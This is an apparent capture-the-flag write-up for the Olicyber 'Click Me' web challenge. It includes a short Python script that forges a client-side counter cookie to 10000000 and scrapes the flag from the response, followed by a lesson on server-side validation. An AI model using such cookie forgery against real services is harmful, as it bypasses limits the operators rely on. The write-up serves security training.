---
title: "Click Me — Cookie Integer Forge to Reach Counter Target"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["web", "cookie-manipulation", "python"]
difficulty: "beginner"
summary: "The app tracks clicks with an integer cookie. Skip the clicking by setting 'cookies' to 10000000 directly and request the page — the server trusts the cookie value and returns the flag."
---

## The Challenge

A "click counter" web app. You are supposed to click a button many millions of times to reach the target. The click count is stored in a client-side cookie named `cookies`.

## Approach

The server reads `$_COOKIE['cookies']` (or the equivalent) without any server-side state. Setting the cookie to the target value directly skips all the clicking. One GET request with the forged cookie is enough.

## Solution

```python
from bs4 import BeautifulSoup
import requests
site = "http://click-me.challs.olicyber.it/"
s = requests.Session()
f = s.get(site, cookies={"cookies":f"{10000000}"}).text
b = BeautifulSoup(f, 'html.parser')
for i in b.find_all("h1"):
    print(str(i).replace("<h1>","").replace("</h1>",""), end="")
```

`cookies={"cookies": "10000000"}` forges the counter at the target value. BeautifulSoup parses the response and extracts the flag from the first `<h1>` element.

## What I Learned

Client-side counter state (cookies, localStorage, session storage) is always forgeable. Any security-relevant threshold that relies on a client-controlled counter must be validated on the server against a server-side record of actual clicks.
